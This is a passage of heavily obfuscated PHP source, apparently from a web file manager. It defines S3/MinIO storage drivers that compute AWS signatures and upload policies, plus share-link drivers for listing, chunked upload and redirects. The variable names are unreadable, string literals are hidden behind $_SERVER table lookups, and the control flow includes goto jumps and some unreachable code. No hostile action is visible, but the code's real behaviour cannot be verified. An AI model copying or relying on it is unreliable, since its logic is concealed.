¶Ä) { return !1; } $Æó‡èœ = array($º½½Ø´[281] => $êò ¶Ä, $º½½Ø´[206] => $this->getHost() . $º½½Ø´[8] . $this->pathEncode($µ®²¦Û), $º½½Ø´[282] => $ĞŸ¢ƒ½, $º½½Ø´[95] => $µ®²¦Û, $º½½Ø´[256] => $this->signVer); if ($this->_isClientAsync()) { unset($Æó‡èœ[$º½½Ø´[256]]); } return $Æó‡èœ; } public function uploadMultiAuth($„¾ÚØ—ô, $Ïê¨Âª = array()) { $¸ø¬–ÈŠ =& $_SERVER[©—Ò»ÅĞ]; if ($this->signVer == $¸ø¬–ÈŠ[247]) { if (isset($Ïê¨Âª[$¸ø¬–ÈŠ[283]])) { return $this->uploadPartAuthV2($„¾ÚØ—ô, $Ïê¨Âª); } return $this->uploadListAuthV2($„¾ÚØ—ô, $Ïê¨Âª); } if (isset($Ïê¨Âª[$¸ø¬–ÈŠ[283]])) { return $this->uploadPartAuthV4($„¾ÚØ—ô, $Ïê¨Âª); } return $this->uploadListAuthV4($„¾ÚØ—ô, $Ïê¨Âª); } public function uploadPartAuthV2($¸ˆÍœ¡², $›ö¢¶Ç = array()) { $Àµ”œô§ =& $_SERVER[©—Ò»ÅĞ]; $û‰ÌÆõœ = $›ö¢¶Ç[$Àµ”œô§[95]]; $¸¡ºîù = gmdate($Àµ”œô§[279]); $¤¨ô˜´ = array_intersect_key($›ö¢¶Ç, array_flip(array($Àµ”œô§[283], $Àµ”œô§[281]))); ksort($¤¨ô˜´); $€Çô‡ã® = $¤¨ô˜´ ? $Àµ”œô§[76] . http_build_query($¤¨ô˜´, null, $Àµ”œô§[284], PHP_QUERY_RFC3986) : $Àµ”œô§[12]; $×ò¼ÙŠº = array($Àµ”œô§[253], $Àµ”œô§[12], $Àµ”œô§[120], $Àµ”œô§[12], "\x78\x2d\141\155\172\55\144\141\x74\145\x3a{$¸¡ºîù}", $Àµ”œô§[8] . $this->bucket . $Àµ”œô§[8] . $this->pathEncode($û‰ÌÆõœ) . $€Çô‡ã®); $‡ç¿¤ùø = implode($Àµ”œô§[285], $×ò¼ÙŠº); $Áİä©¥¸ = $this->client->__getSignature($‡ç¿¤ùø); return array($Àµ”œô§[286] => $Áİä©¥¸, $Àµ”œô§[282] => $¸¡ºîù); } public function uploadListAuthV2($™ÛõûìÅ, $ÏşÄ£ÓÁ = array()) { $ºî·Ê™ =& $_SERVER[©—Ò»ÅĞ]; $››‚‘¢ª = $ÏşÄ£ÓÁ[$ºî·Ê™[95]]; $æá­à¸Ä = $ÏşÄ£ÓÁ[$ºî·Ê™[281]]; $ŒìÎšöÕ = $this->client->listParts($this->bucket, $››‚‘¢ª, $æá­à¸Ä); if (!$ŒìÎšöÕ) { return !1; } $½ñ‹ˆÜß = gmdate($ºî·Ê™[279]); $êÈÛˆÖ× = $ºî·Ê™[287] . $æá­à¸Ä; $œÄşì‘È = array($ºî·Ê™[288], $ºî·Ê™[12], $ºî·Ê™[120], $ºî·Ê™[12], "\170\x2d\x61\x6d\x7a\x2d\144\x61\164\145\72{$½ñ‹ˆÜß}", $ºî·Ê™[8] . $this->bucket . $ºî·Ê™[8] . $this->pathEncode($››‚‘¢ª) . $êÈÛˆÖ×); $ÔÜšÑ¬ó = implode($ºî·Ê™[285], $œÄşì‘È); $åÁì€¦ç = $this->client->__getSignature($ÔÜšÑ¬ó); return array($ºî·Ê™[286] => $åÁì€¦ç, $ºî·Ê™[282] => $½ñ‹ˆÜß, $ºî·Ê™[289] => $ŒìÎšöÕ); } public function uploadPartAuthV4($ÀúÙœ®‹, $¶´ùÄ÷€ = array()) { $‡Î¿»ïù =& $_SERVER[©—Ò»ÅĞ]; $­€ßò²… = $¶´ùÄ÷€[$‡Î¿»ïù[95]]; $”èéÁŒù = array($‡Î¿»ïù[273] => gmdate($‡Î¿»ïù[280]), $‡Î¿»ïù[290] => _get($¶´ùÄ÷€, $‡Î¿»ïù[291], hash($‡Î¿»ïù[275], $‡Î¿»ïù[12]))); $ŞøµÓĞÃ = explode($‡Î¿»ïù[208], $this->getHost()); $Œ·ç¹°¤ = array($‡Î¿»ïù[292] => $ŞøµÓĞÃ[1], $‡Î¿»ïù[293] => $‡Î¿»ïù[12], $‡Î¿»ïù[246] => $‡Î¿»ïù[120], $‡Î¿»ïù[294] => $¶´ùÄ÷€[$‡Î¿»ïù[79]]); $×†»§¨ = $‡Î¿»ïù[253]; $á”‰¸®‹ = $‡Î¿»ïù[8] . $this->pathEncode($­€ßò²…); $Í«¨··¢ = array_intersect_key($¶´ùÄ÷€, array_flip(array($‡Î¿»ïù[283], $‡Î¿»ïù[281]))); $ô¡Şä¿ç = $this->client->__getSignatureV4($”èéÁŒù, $Œ·ç¹°¤, $×†»§¨, $á”‰¸®‹, $Í«¨··¢); return array($‡Î¿»ïù[286] => $ô¡Şä¿ç, $‡Î¿»ïù[290] => $”èéÁŒù[$‡Î¿»ïù[290]], $‡Î¿»ïù[282] => $”èéÁŒù[$‡Î¿»ïù[273]]); } public function uploadListAuthV4($»²µÛ«õ, $×’¸’ø = array()) { $•·Å¤æ° =& $_SERVER[©—Ò»ÅĞ]; $ñùïü˜Ë = $×’¸’ø[$•·Å¤æ°[95]]; $å™İ“Ûò = $×’¸’ø[$•·Å¤æ°[281]]; $™°¦»ß• = $this->client->listParts($this->bucket, $ñùïü˜Ë, $å™İ“Ûò); if (!$™°¦»ß•) { return !1; } $ßÕ‰À¡ã = $•·Å¤æ°[295]; foreach ($™°¦»ß• as $¯¡‘ß) { $ßÕ‰À¡ã .= $•·Å¤æ°[296] . "\74\120\x61\162\x74\116\165\x6d\x62\145\162\x3e{$¯¡‘ß[$•·Å¤æ°[297]]}\74\x2f\120\x61\162\x74\116\x75\x6d\x62\145\162\76\xa" . "\74\105\x54\x61\x67\76{$¯¡‘ß[$•·Å¤æ°[298]]}\x3c\57\105\x54\141\147\76\xa" . $•·Å¤æ°[299]; } $ßÕ‰À¡ã .= $•·Å¤æ°[300]; $’Øª¹ô = array($•·Å¤æ°[273] => gmdate($•·Å¤æ°[280]), $•·Å¤æ°[290] => hash($•·Å¤æ°[275], $ßÕ‰À¡ã)); $‡–®—Æï = explode($•·Å¤æ°[208], $this->getHost()); $èºÏ³â¯ = array($•·Å¤æ°[292] => $‡–®—Æï[1], $•·Å¤æ°[246] => $•·Å¤æ°[120], $•·Å¤æ°[294] => strlen($ßÕ‰À¡ã)); $í†½ñÏö = $•·Å¤æ°[288]; $º¿ù’± = $•·Å¤æ°[8] . $this->pathEncode($ñùïü˜Ë); $€éöáÑ = array($•·Å¤æ°[281] => $å™İ“Ûò); $İ¸Ü“È× = $this->client->__getSignatureV4($’Øª¹ô, $èºÏ³â¯, $í†½ñÏö, $º¿ù’±, $€éöáÑ); return array($•·Å¤æ°[286] => $İ¸Ü“È×, $•·Å¤æ°[290] => $’Øª¹ô[$•·Å¤æ°[290]], $•·Å¤æ°[282] => $’Øª¹ô[$•·Å¤æ°[273]], $•·Å¤æ°[289] => $™°¦»ß•); } private function _isClientAsync() { $ÁçæÇ—º =& $_SERVER[©—Ò»ÅĞ]; static $è¶›¯ó = null; if ($è¶›¯ó === null) { $ü ÛµÖ = isset($_REQUEST[$ÁçæÇ—º[301]]) ? json_decode($_REQUEST[$ÁçæÇ—º[301]], !0) : !1; $è¶›¯ó = $ü ÛµÖ && _get($ü ÛµÖ, $ÁçæÇ—º[302]) == $ÁçæÇ—º[303]; } return $è¶›¯ó; } public function getHost() { $ÉÙŞµğ™ =& $_SERVER[©—Ò»ÅĞ]; $ÍÄÆµüã = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÉÙŞµğ™[70], $ÉÙŞµğ™[64], $ÉÙŞµğ™[69], $ÉÙŞµğ™[62]))) { return $ÍÄÆµüã . $ÉÙŞµğ™[8] . $this->bucket; } if ($this->osType == $ÉÙŞµğ™[62] && !is_domain($ÍÄÆµüã)) { return $ÍÄÆµüã . $ÉÙŞµğ™[8] . $this->bucket; } $ÍÄÆµüã = explode($ÉÙŞµğ™[208], $ÍÄÆµüã); return $ÍÄÆµüã[0] . $ÉÙŞµğ™[208] . $this->bucket . $ÉÙŞµğ™[10] . $ÍÄÆµüã[1]; } public function size($¼‹·ëşè) { $ÙËÆ¤Ö¢ = $this->objectMeta($¼‹·ëşè); return $ÙËÆ¤Ö¢ ? $ÙËÆ¤Ö¢[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function info($Èå‡éí) { if ($this->isFolder($Èå‡éí)) { return $this->folderInfo($Èå‡éí); } else { if ($this->isFile($Èå‡éí)) { return $this->fileInfo($Èå‡éí); } } return !1; } public function exist($•ÌıŠëÇ) { return $this->isFile($•ÌıŠëÇ) || $this->isFolder($•ÌıŠëÇ); } public function isFile($ä”áµê) { return !$this->isFolder($ä”áµê) && $this->objectMeta($ä”áµê); } public function isFolder($´‚ ¥ÆÊ) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][177], $´‚ ¥ÆÊ); } protected function objectMeta($Öú•‰à•) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][179], $Öú•‰à•); } protected function _objectMeta($ÃßÃ¦¢ô) { $‹˜¡Ú£Ç =& $_SERVER[©—Ò»ÅĞ]; $ÃßÃ¦¢ô = rtrim($ÃßÃ¦¢ô, $‹˜¡Ú£Ç[8]); try { $½ğ‹§¼÷ = $this->client->getObjectInfo($this->bucket, $ÃßÃ¦¢ô); if (!isset($½ğ‹§¼÷[$‹˜¡Ú£Ç[252]]) && isset($½ğ‹§¼÷[$‹˜¡Ú£Ç[304]])) { $½ğ‹§¼÷[$‹˜¡Ú£Ç[252]] = $½ğ‹§¼÷[$‹˜¡Ú£Ç[304]]; } } catch (Exception $Ñ†’×¾) { $½ğ‹§¼÷ = !1; } if (!$½ğ‹§¼÷) { } return $½ğ‹§¼÷; } protected function _isFolder($÷–Ş‘äô) { $÷çÛË =& $_SERVER[©—Ò»ÅĞ]; $÷–Ş‘äô = rtrim($÷–Ş‘äô, $÷çÛË[8]) . $÷çÛË[8]; if ($÷–Ş‘äô == $÷çÛË[12] || $÷–Ş‘äô == $÷çÛË[8]) { return !0; } $¡ï›À´ø = $this->client->getBucket($this->bucket, $÷–Ş‘äô, null, 1); if (empty($¡ï›À´ø[$÷çÛË[236]])) { return !1; } $¡‘ñ¾µ = $¡ï›À´ø[$÷çÛË[236]][0][$÷çÛË[32]]; return stripos($¡‘ñ¾µ, $÷–Ş‘äô) === 0 ? !0 : !1; if (substr($¡‘ñ¾µ, -1) == $÷çÛË[8]) { return !0; } if (get_path_this($¡‘ñ¾µ) == get_path_this($÷–Ş‘äô)) { return !1; } return !0; } public function listObject($“Òû„ ¿) { return $this->fileList($“Òû„ ¿, $_SERVER[©—Ò»ÅĞ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¹Ó×Æ×) { $‰ˆ¤à† =& $_SERVER[©—Ò»ÅĞ]; parent::__construct($¹Ó×Æ×); $this->setSignVersion($‰ˆ¤à†[247]); if (!$this->region) { $this->region = $‰ˆ¤à†[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($¯ê»÷´—, $Ğ…õ‚¤ = 3600) { $®¬Ñé³± =& $_SERVER[©—Ò»ÅĞ]; $‚ÛÉì‹ = $®¬Ñé³±[229]; $°•˜œ‹ = $®¬Ñé³±[257]; $Ãñ÷Ä™‡ = $®¬Ñé³±[62]; $èŞ¨ç¾• = gmdate($®¬Ñé³±[258]); $ ®òˆõ§ = gmdate($®¬Ñé³±[259]); $õÅ‘²Å› = $®¬Ñé³±[260]; $±××âÌ = $Ğ…õ‚¤ . $®¬Ñé³±[12]; $ˆ±Îº‘• = $®¬Ñé³±[261]; $ûòÀúÇå = array($this->accessKey, $ ®òˆõ§, $this->region, $Ãñ÷Ä™‡, $õÅ‘²Å›); $²³¤œšÒ = implode($®¬Ñé³±[8], $ûòÀúÇå); $şŒËÚ½ = array($®¬Ñé³±[262] => gmdate($®¬Ñé³±[263], strtotime($®¬Ñé³±[264])), $®¬Ñé³±[265] => array(array($®¬Ñé³±[266] => $this->bucket), array($®¬Ñé³±[306] => $‚ÛÉì‹), array($®¬Ñé³±[267], $®¬Ñé³±[268], $®¬Ñé³±[12]), array($®¬Ñé³±[267], $®¬Ñé³±[269], $®¬Ñé³±[12]), array($®¬Ñé³±[267], $®¬Ñé³±[307], $®¬Ñé³±[12]), array($®¬Ñé³±[270] => $ˆ±Îº‘•), array($®¬Ñé³±[271] => $²³¤œšÒ), array($®¬Ñé³±[272] => $°•˜œ‹), array($®¬Ñé³±[273] => $èŞ¨ç¾•), array($®¬Ñé³±[274] => $±××âÌ))); $¸äÀÏÏ = base64_encode(json_encode($şŒËÚ½)); $ì¸Ï»†Ø = hash_hmac($®¬Ñé³±[275], $ ®òˆõ§, $®¬Ñé³±[276] . $this->secret, !0); $Ê÷Ñ–€š = hash_hmac($®¬Ñé³±[275], $this->region, $ì¸Ï»†Ø, !0); $Ø®·ñó = hash_hmac($®¬Ñé³±[275], $Ãñ÷Ä™‡, $Ê÷Ñ–€š, !0); $‘·øË’ = hash_hmac($®¬Ñé³±[275], $õÅ‘²Å›, $Ø®·ñó, !0); $¯ŸªœÅÓ = hash_hmac($®¬Ñé³±[275], $¸äÀÏÏ, $‘·øË’); $•ûÔ²ö­ = array($®¬Ñé³±[246] => $®¬Ñé³±[12], $®¬Ñé³±[294] => $®¬Ñé³±[12], $®¬Ñé³±[306] => $‚ÛÉì‹, $®¬Ñé³±[270] => $ˆ±Îº‘•, $®¬Ñé³±[277] => $¸äÀÏÏ, $®¬Ñé³±[308] => $²³¤œšÒ, $®¬Ñé³±[309] => $°•˜œ‹, $®¬Ñé³±[310] => $èŞ¨ç¾•, $®¬Ñé³±[311] => $±××âÌ, $®¬Ñé³±[312] => $¯ŸªœÅÓ, $®¬Ñé³±[206] => $this->getHost()); return $•ûÔ²ö­; } } goto eŠ¹ŸÔøİİ; fµÚ‹Ê·¿: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ğ¢Àš½ƒ) { $this->pathParse = $Ğ¢Àš½ƒ; } protected function infoParse($®À±ªòí, $£Í¬ÙÚÁ = false) { $ËÈÚ¤¨° =& $_SERVER[©—Ò»ÅĞ]; return Action($ËÈÚ¤¨°[1363])->sharePathInfo($this->pathParse[$ËÈÚ¤¨°[87]], !0, $£Í¬ÙÚÁ); } public function listPath($™¶âÜ×Û, $±ÎÏÔ„Ô = false) { $ß¾’‰Ù =& $_SERVER[©—Ò»ÅĞ]; $â¨èâÖÊ = IO::listPath($™¶âÜ×Û, $±ÎÏÔ„Ô); if (!$â¨èâÖÊ) { return $â¨èâÖÊ; } if (is_array($â¨èâÖÊ[$ß¾’‰Ù[967]])) { $Øîè‚½ = Action($ß¾’‰Ù[1549])->parsePathChildren($â¨èâÖÊ[$ß¾’‰Ù[967]], array($ß¾’‰Ù[510] => $™¶âÜ×Û)); $â¨èâÖÊ[$ß¾’‰Ù[967]] = Action($ß¾’‰Ù[1363])->shareItemInfo($Øîè‚½); } foreach ($â¨èâÖÊ as $íĞÎ–Õš => $Œ¡º§ã) { if (!in_array($íĞÎ–Õš, array($ß¾’‰Ù[86], $ß¾’‰Ù[85]))) { continue; } foreach ($Œ¡º§ã as $™§µìĞİ => $Øîè‚½) { $Øîè‚½ = Action($ß¾’‰Ù[1549])->parsePathChildren($Øîè‚½, array($ß¾’‰Ù[510] => $™¶âÜ×Û)); $â¨èâÖÊ[$íĞÎ–Õš][$™§µìĞİ] = Action($ß¾’‰Ù[1363])->shareItemInfo($Øîè‚½); } } return $â¨èâÖÊ; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($«É¡ìúÜ) { $ù±°Æ² =& $_SERVER[©—Ò»ÅĞ]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $«É¡ìúÜ; $¹Ÿ‚ÓìÚ = Model($ù±°Æ²[686])->getInfo($«É¡ìúÜ[$ù±°Æ²[487]]); $Íà‚é¯¯ = _get($¹Ÿ‚ÓìÚ, $ù±°Æ²[580]); $‘Æ”¤ˆ  = Model($ù±°Æ²[587])->authMake(_get($¹Ÿ‚ÓìÚ, $ù±°Æ²[1550])); if (!$¹Ÿ‚ÓìÚ) { IO::errorTips(LNG($ù±°Æ²[1551]), !1); } if (!$‘Æ”¤ˆ ) { IO::errorTips(LNG($ù±°Æ²[1552]), !1); } if ($Íà‚é¯¯ && is_string($Íà‚é¯¯)) { $Íà‚é¯¯ = json_decode($Íà‚é¯¯, !0); } if (!$Íà‚é¯¯ || !$‘Æ”¤ˆ ) { return; } $this->_config = array($ù±°Æ²[1357] => rtrim($«É¡ìúÜ[$ù±°Æ²[1357]], $ù±°Æ²[8]) . $ù±°Æ²[8], $ù±°Æ²[1553] => $ù±°Æ²[1461] . $Íà‚é¯¯[$ù±°Æ²[1554]] . $ù±°Æ²[499], $ù±°Æ²[576] => $¹Ÿ‚ÓìÚ, $ù±°Æ²[580] => $Íà‚é¯¯, $ù±°Æ²[1555] => $‘Æ”¤ˆ , $ù±°Æ²[1556] => substr(APP_HOST, 0, 8) == $ù±°Æ²[217], $ù±°Æ²[1557] => Model($ù±°Æ²[591])->authCheck($‘Æ”¤ˆ [$ù±°Æ²[503]], AuthModel::AUTH_VIEW, !1), $ù±°Æ²[1558] => Model($ù±°Æ²[591])->authCheck($‘Æ”¤ˆ [$ù±°Æ²[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($´ùá›ï¸) { $¡ı´×â =& $_SERVER[©—Ò»ÅĞ]; $ìÀ¦ğÅ‹ = $this->_config; if (!$ìÀ¦ğÅ‹) { return !1; } $ÀÒ¬ñ€¢ = array($¡ı´×â[1559] => $ìÀ¦ğÅ‹[$¡ı´×â[1557]], $¡ı´×â[1560] => $ìÀ¦ğÅ‹[$¡ı´×â[1557]], $¡ı´×â[1385] => $ìÀ¦ğÅ‹[$¡ı´×â[1557]], $¡ı´×â[107] => $ìÀ¦ğÅ‹[$¡ı´×â[1558]], $¡ı´×â[1561] => $ìÀ¦ğÅ‹[$¡ı´×â[1558]], $¡ı´×â[1334] => $ìÀ¦ğÅ‹[$¡ı´×â[1558]], $¡ı´×â[1562] => !1, $¡ı´×â[429] => !1, $¡ı´×â[1563] => !1, $¡ı´×â[1564] => !1); return $ÀÒ¬ñ€¢[$´ùá›ï¸]; } public function listPath($ú¿„Œ«¹, $ÅñıŒÚ¢ = false) { return $this->request($_SERVER[©—Ò»ÅĞ][1565], array($ú¿„Œ«¹)); } public function setContent($—¦şƒøû, $ƒóüœ€€ = '') { return $this->request($_SERVER[©—Ò»ÅĞ][1566], array($—¦şƒøû, $ƒóüœ€€)); } public function getContent($ÚçÓ Î´) { return $this->_fileSubstr($ÚçÓ Î´); } public function fileSubstr($¾³—›»ı, $‘Ùìøáë, $ÈÍæ’“û) { return $this->_fileSubstr($¾³—›»ı, $‘Ùìøáë, $ÈÍæ’“û); } public function download($ÉîäÀøÈ, $±æÚ‹ü) { return $this->_download($ÉîäÀøÈ, $±æÚ‹ü); } public function isFileOutServer() { return !1; } public function fileOut($ç ¼¸‚˜, $ô²—“êä = false, $‚½±Ö¿Ç = false, $ˆµ±‚è = '') { $¯À“±É¢ =& $_SERVER[©—Ò»ÅĞ]; $this->fileOutLink($this->_fileLink($ç ¼¸‚˜, ($ˆµ±‚è ? $¯À“±É¢[1567] . $ˆµ±‚è : $¯À“±É¢[12]) . ($ô²—“êä ? $¯À“±É¢[1568] : $¯À“±É¢[12]))); } public function fileOutImage($ßÌÈ‰ıÒ, $Ãˆâá¤ü = 250) { $this->fileOutLink($this->_fileLink($ßÌÈ‰ıÒ, $_SERVER[©—Ò»ÅĞ][1569] . $Ãˆâá¤ü)); } public function fileOutLink($Şº©–î) { header($_SERVER[©—Ò»ÅĞ][172] . $this->urlAuto($Şº©–î)); die; } public function exist($±«•Û›ú) { $ËµçíÔÜ = $this->_info($±«•Û›ú); return $ËµçíÔÜ ? !0 : !1; } public function isFile($ÅÑŸ‹Ï¢) { $í¢×ÇÑ‚ =& $_SERVER[©—Ò»ÅĞ]; $Éà–Û†‡ = $this->_info($ÅÑŸ‹Ï¢); return _get($Éà–Û†‡, $í¢×ÇÑ‚[33], $í¢×ÇÑ‚[12]) == $í¢×ÇÑ‚[230]; } public function isFolder($¼ÇÒ×ñ») { $¸½ğÀ¶› =& $_SERVER[©—Ò»ÅĞ]; $©‹°ÁÂ = $this->_info($¼ÇÒ×ñ»); return _get($©‹°ÁÂ, $¸½ğÀ¶›[33], $¸½ğÀ¶›[12]) == $¸½ğÀ¶›[78]; } public function size($ä·áó‚ì) { $º÷Æ÷ıÇ = $this->_info($ä·áó‚ì); return _get($º÷Æ÷ıÇ, $_SERVER[©—Ò»ÅĞ][79], 0); } public function info($„Ã˜ı§) { return $this->_info($„Ã˜ı§); } public function infoAuth($ìÜ•ˆ¸–) { return $this->_info($ìÜ•ˆ¸–); } public function infoFull($ÚÉ÷»åú) { return $this->_info($ÚÉ÷»åú); } public function infoFullSimple($ñ‰ƒ“‘Æ) { return $this->_info($ñ‰ƒ“‘Æ); } public function infoWithChildren($Éœ¡ˆÍ) { return $this->_info($Éœ¡ˆÍ, !0); } public function has($ó¥ª²­“, $æ«ê×Àµ = false, $ÙîÚ…Š¦ = false) { $º¬³¥ı¿ =& $_SERVER[©—Ò»ÅĞ]; $ÜôÈ»É… = $this->_info($ó¥ª²­“); if (!$ÜôÈ»É…) { return !1; } if ($æ«ê×Àµ) { return array($º¬³¥ı¿[239] => $ÜôÈ»É…[$º¬³¥ı¿[239]], $º¬³¥ı¿[240] => $ÜôÈ»É…[$º¬³¥ı¿[240]]); } return $à¬ôã¼ ? $ÜôÈ»É…[$º¬³¥ı¿[239]] > 0 : $ÜôÈ»É…[$º¬³¥ı¿[240]] > 0; } public function mkfile($Çá…¸Õ¤, $š¢÷¼¥ = '', $–òíË¹ı = REPEAT_RENAME) { return $this->request($_SERVER[©—Ò»ÅĞ][1542], array($Çá…¸Õ¤, $š¢÷¼¥, $–òíË¹ı)); } public function mkdir($˜¿Âç¢¤, $Ô¶Ó«± = REPEAT_SKIP) { return $this->request($_SERVER[©—Ò»ÅĞ][1543], array($˜¿Âç¢¤, $Ô¶Ó«±)); } public function remove($ÑßæÆû) { return $this->request($_SERVER[©—Ò»ÅĞ][1334], array($ÑßæÆû)); } public function rename($æ°«šú, $ó¤™á¬Ì) { return $this->request($_SERVER[©—Ò»ÅĞ][1546], array($æ°«šú, $ó¤™á¬Ì)); } public function moveSameAllow() { } public function copy($ŞÚÔÑÔŠ, $×ÔÉ¶ƒƒ, $¡øÔ–ŞÉ = REPEAT_REPLACE, $÷ƒşñ‹± = false) { return $this->request($_SERVER[©—Ò»ÅĞ][641], array($ŞÚÔÑÔŠ, $×ÔÉ¶ƒƒ, $¡øÔ–ŞÉ)); } public function move($¯×Ôïİí, $ñâÀÈ ”, $Íâü© = REPEAT_REPLACE, $•˜«¥ğ— = false) { return $this->request($_SERVER[©—Ò»ÅĞ][643], array($¯×Ôïİí, $ñâÀÈ ”, $Íâü©)); } public function uploadLink($‘‘Òšâ, $«°À¿¶ä = 0) { $—Õ¨è™ =& $_SERVER[©—Ò»ÅĞ]; $ÑˆÛâ§– = IO::init($GLOBALS[$—Õ¨è™[7]][$—Õ¨è™[87]]); $‘°ÏİšÁ = $this->pathApiEncode($ÑˆÛâ§–->path); $¡Şğ°²Ç = $this->requestMakeUrl($—Õ¨è™[1570], array($—Õ¨è™[87] => $‘°ÏİšÁ)); return array($—Õ¨è™[1571] => $¡Şğ°²Ç); } public function upload($Ä‹”ÓÔé, $İÀ¢¯‹², $Ã‘ˆªš = false, $¥ôĞµÓ = REPEAT_REPLACE) { $’‰¡çºù =& $_SERVER[©—Ò»ÅĞ]; if (filesize($İÀ¢¯‹²) < $this->uploadChunkSize) { return $this->request($’‰¡çºù[107], array($Ä‹”ÓÔé, $İÀ¢¯‹², $¥ôĞµÓ)); } $ã€ä«‹¥ = $this->uploadHashCheck($Ä‹”ÓÔé, $İÀ¢¯‹², $¥ôĞµÓ); if ($ã€ä«‹¥) { return $ã€ä«‹¥; } $³ß¢» = @filesize($İÀ¢¯‹²); $©Ñö’  = $this->uploadChunkSize; $£ü…ëª = ceil($³ß¢» / $©Ñö’ ); $•şÙôîÈ = 0; while ($•şÙôîÈ < $£ü…ëª) { $úº…–´ˆ = IO::fileSubstr($İÀ¢¯‹², $•şÙôîÈ * $©Ñö’ , $©Ñö’ ); $óˆë—Ö… = $this->tempFile($’‰¡çºù[12], $úº…–´ˆ); $Ç—úï¸´ = array($’‰¡çºù[79] => $³ß¢», $’‰¡çºù[1572] => $©Ñö’ , $’‰¡çºù[1573] => $£ü…ëª, $’‰¡çºù[1574] => $•şÙôîÈ); $¡‹Ğ§Ã = $this->uploadSend($Ä‹”ÓÔé, $óˆë—Ö…, $Ç—úï¸´, $¥ôĞµÓ); $•şÙôîÈ++; if (!$¡‹Ğ§Ã) { return !1; } } if (!is_array($¡‹Ğ§Ã) || empty($¡‹Ğ§Ã[$’‰¡çºù[595]])) { return !1; } return $this->pathApiDecode($¡‹Ğ§Ã[$’‰¡çºù[595]]); } private function uploadHashCheck($Û’¼‹ØÑ, $á«ÈßĞÍ, $„µ ³õä) { $µåšõÄã =& $_SERVER[©—Ò»ÅĞ]; $§‰øÎ§ = IO::hashSimple($á«ÈßĞÍ); $”ÂÒÏÅØ = array($µåšõÄã[1575] => $µåšõÄã[1576], $µåšõÄã[1535] => $§‰øÎ§); $ÂË¹«˜ = $this->uploadSend($Û’¼‹ØÑ, $µåšõÄã[12], $”ÂÒÏÅØ, $„µ ³õä); $È†âÒÍ = _get($ÂË¹«˜, $µåšõÄã[595], array()); $³·±™™ = _get($È†âÒÍ, $µåšõÄã[1577]); if (!is_array($³·±™™) || !$³·±™™[$µåšõÄã[563]]) { return !1; } $¡áƒ¬ˆ¼ = IO::hashMd5($á«ÈßĞÍ); if ($³·±™™[$µåšõÄã[563]] != $¡áƒ¬ˆ¼) { return !1; } if ($ÂË¹«˜[$µåšõÄã[595]][$µåšõÄã[1578]]) { $this->uploadChunkSize = $ÂË¹«˜[$µåšõÄã[595]][$µåšõÄã[1578]]; } $”ÂÒÏÅØ = array($µåšõÄã[1575] => $µåšõÄã[1579], $µåšõÄã[1536] => $¡áƒ¬ˆ¼, $µåšõÄã[1535] => $§‰øÎ§); $ÂË¹«˜ = $this->uploadSend($Û’¼‹ØÑ, $µåšõÄã[12], $”ÂÒÏÅØ, $„µ ³õä); if (!is_array($ÂË¹«˜) || empty($ÂË¹«˜[$µåšõÄã[595]])) { return !1; } return $this->pathApiDecode($ÂË¹«˜[$µåšõÄã[595]]); } private function uploadSend($ÒôËùÁö, $•—”°¡›, $Ççş”·Ê, $¯œÜë¡¢ = '') { $Š‚¸çÜ… =& $_SERVER[©—Ò»ÅĞ]; $Ççş”·Ê[$Š‚¸çÜ…[32]] = get_path_this($ÒôËùÁö); $Ççş”·Ê[$Š‚¸çÜ…[87]] = $this->pathApiEncode(get_path_father($ÒôËùÁö)); if ($¯œÜë¡¢) { $Ççş”·Ê[$Š‚¸çÜ…[1580]] = $¯œÜë¡¢; } if ($•—”°¡›) { $Ççş”·Ê[$Š‚¸çÜ…[230]] = $Š‚¸çÜ…[1398] . $•—”°¡›; } return $this->requestSend($Š‚¸çÜ…[1570], $Ççş”·Ê); } protected function pathApiEncode($Æ¸³õ²) { $ôÜºï¶ğ =& $_SERVER[©—Ò»ÅĞ]; $äã²’¨Ï = $this->_config[$ôÜºï¶ğ[1553]]; $ìÂ±·è® = strlen($äã²’¨Ï); if (substr($Æ¸³õ², 0, $ìÂ±·è®) == $äã²’¨Ï) { return $Æ¸³õ²; } return $äã²’¨Ï . ltrim($Æ¸³õ², $ôÜºï¶ğ[8]); } protected function pathApiDecode($âğ¼¡¾Ï) { $ß§àÙÂ› =& $_SERVER[©—Ò»ÅĞ]; $Šíòâ = $this->_config[$ß§àÙÂ›[1553]]; $•ôŞòÁ´ = strlen($Šíòâ); if (substr($âğ¼¡¾Ï, 0, $•ôŞòÁ´) !== $Šíòâ) { return $âğ¼¡¾Ï; } return $this->_config[$ß§àÙÂ›[1357]] . ltrim(substr($âğ¼¡¾Ï, $•ôŞòÁ´), $ß§àÙÂ›[8]); } private function pathInfoParse(&$¹¼É€›) { $ÖÜ„úíñ =& $_SERVER[©—Ò»ÅĞ]; $ŸöÍ…å¼ = $this->_config; $Ë˜Íöœ± = $ŸöÍ…å¼[$ÖÜ„úíñ[576]]; if (!$¹¼É€› || !is_array($¹¼É€›)) { return $¹¼É€›; } static $®©£Ğ´  = array(); $ßâİ›Ô« = $®©£Ğ´ [$Ë˜Íöœ±[$ÖÜ„úíñ[687]]]; if (!is_array($ßâİ›Ô«)) { $ƒÆøÅû  = LNG($ÖÜ„úíñ[1581]); $ÏĞ¯„‹ = $ŸöÍ…å¼[$ÖÜ„úíñ[580]][$ÖÜ„úíñ[90]]; $¸ßùÕ‡‹ = parse_url($ŸöÍ…å¼[$ÖÜ„úíñ[580]][$ÖÜ„úíñ[1582]]); $¼ñÆı·Ê = $ŸöÍ…å¼[$ÖÜ„úíñ[580]][$ÖÜ„úíñ[1583]]; $ßâİ›Ô« = array($ÖÜ„úíñ[1584] => $ÏĞ¯„‹[$ÖÜ„úíñ[32]] . $ÖÜ„úíñ[1064] . $¼ñÆı·Ê . $ÖÜ„úíñ[1398] . 